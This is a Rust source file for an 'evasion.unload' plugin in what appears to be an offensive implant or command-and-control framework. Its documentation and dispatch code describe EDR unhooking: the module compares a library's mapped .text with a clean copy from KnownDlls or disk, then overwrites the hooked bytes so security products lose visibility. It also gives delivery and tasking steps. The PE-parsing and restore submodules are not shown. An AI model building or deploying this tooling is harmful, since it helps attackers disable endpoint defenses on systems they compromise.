//! The defense-evasion family's second module (architecture.md Sec
//! 5.4): `evasion.unload`, the module-layer implementation behind the
//! kernel's placeholder verb -- the placeholder carried the contract
//! and the `modifies-defenses` OPSEC flag; this plugin carries the
//! act, and every dispatched restore rides the task audit dispatched
//! actions already enter.
//!
//! The technique is the classic fresh-copy unhook: an EDR's inline
//! hooks live as rewritten bytes in a library's mapped `.text`, and a
//! clean copy of the same build still carries what the linker wrote.
//! The grammar gives one verb two actions: the bare task is the read
//! -- both images parsed out of their own bytes (headers, section
//! table, the `.text` span), compared byte for byte, the differing
//! count reported -- and `restore` is the write the operator names:
//! page flipped writable, the fresh `.text` copied over the mapped
//! one, protection restored, instruction cache flushed. Idempotent by
//! read: a second restore reports `already matches` rather than
//! writing again.
//!
//! v1.1 widens the scope three ways the task names. Any loaded
//! library rides the same act (per-DLL, `ntdll.dll` the bare task's
//! default). The named exports alone address their own extents
//! (per-function, each extent its own RVA to the next export's, read
//! out of the mapped image's own export table -- a forwarder or a
//! data export refuses its row, named). And the freshness source is
//! the KnownDlls section object first (the loader's own clean copy, a
//! copy no on-disk tamper reaches, read through no file at all), the
//! disk file under System32 the fallback the row names.
//!
//! The scope stays honest on two facts. The compare trusts the fresh
//! copy only as far as a build fingerprint (machine, section count,
//! linker timestamp, image size) carries: a copy the mapped image
//! does not match refuses rather than writing wrong bytes. And a
//! mapped image the loader relocated off its preferred base can carry
//! relocated pointers in `.text` that count as differences a restore
//! should not blindly rewrite -- the classic system libraries are
//! relative code on both architectures this verb ships for, so the
//! ordinary case carries none. Nothing lands on disk: the module
//! reads the fresh copy and rewrites pages of this process's own
//! mapping -- copy-on-write makes them private -- and the effect
//! dies with the process. The compare and the copy are byte
//! arithmetic no architecture owns: both Windows architectures carry
//! the verb.
//!
//! Build for a Windows target (`cargo build --release --target
//! x86_64-pc-windows-gnu`), deliver the cdylib's bytes as a
//! `module.load unload` task's content, then task `evasion.unload`
//! like any compiled verb. A non-Windows build compiles for the lane
//! and refuses the verb at run time: the technique has no mapped
//! libraries to restore there.

mod arguments;
// The fresh-copy edge and the parse it rides are pure and
// host-tested, but only the Windows execution calls them -- the same
// not(windows) allowance the family's other pure halves carry,
// stated once at each module the whole tree of it belongs to.
#[cfg_attr(not(windows), allow(dead_code))]
mod ntdll;
#[cfg_attr(not(windows), allow(dead_code))]
mod pe;

use arguments::Arguments;
use rod_plugin_sdk::{rod_plugin, Plugin, Verb};

// The action the Windows dispatch matches on; off Windows the verb
// refuses before the name is ever spoken, and an unused import would be
// a build warning the lane turns into a failure.
#[cfg(windows)]
use arguments::Action;

pub struct Unload;

impl Plugin for Unload {
    fn name(&self) -> &'static str {
        "unload"
    }

    fn verbs(&self) -> Vec<Verb> {
        vec![Verb::new("evasion.unload", unload)]
    }
}

fn unload(input: &str) -> Result<String, String> {
    let arguments = arguments::parse(input)?;
    arguments::validate(&arguments)?;
    execute(&arguments)
}

/// The Windows execution: the read the bare task names, or the write
/// the operator names -- against the library and the functions the
/// task scopes both to.
#[cfg(windows)]
fn execute(arguments: &Arguments) -> Result<String, String> {
    let dll = arguments.dll.as_deref().unwrap_or(ntdll::DEFAULT_MODULE);
    match arguments.action {
        Action::List => ntdll::list(dll, &arguments.functions),
        Action::Restore => ntdll::restore(dll, &arguments.functions),
    }
}

/// The technique has no mapped libraries off Windows; the manifest's
/// targets keep the module off other loads, and this refusal keeps a
/// stray dispatch honest about why it cannot run.
#[cfg(not(windows))]
fn execute(_arguments: &Arguments) -> Result<String, String> {
    Err(format!(
        "evasion.unload: restoring a mapped library's .text is a Windows technique; this \
         build runs on {}",
        std::env::consts::OS
    ))
}

rod_plugin!(Unload);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_bare_task_is_the_read() {
        // The bare task names the read -- the differing-byte count --
        // and the write stays a word the operator speaks.
        #[cfg(windows)]
        {
            let row = unload("").expect("the bare task reads the comparison");
            assert!(row.contains("differ"), "{row}");
        }
        #[cfg(not(windows))]
        {
            let refusal = unload("").expect_err("off Windows the verb refuses");
            assert!(refusal.contains("Windows technique"), "{refusal}");
            assert!(refusal.contains(std::env::consts::OS), "{refusal}");
        }
    }

    #[test]
    fn a_bad_grammar_refuses_before_anything_runs() {
        assert!(unload("unhook").is_err());
        // A path where a library's name belongs, and an empty name
        // between commas: the widened slots refuse their own typos.
        assert!(unload(r"restore C:\Windows\System32\ntdll.dll").is_err());
        assert!(unload("restore ntdll.dll NtOpenFile,,NtClose").is_err());
    }
}
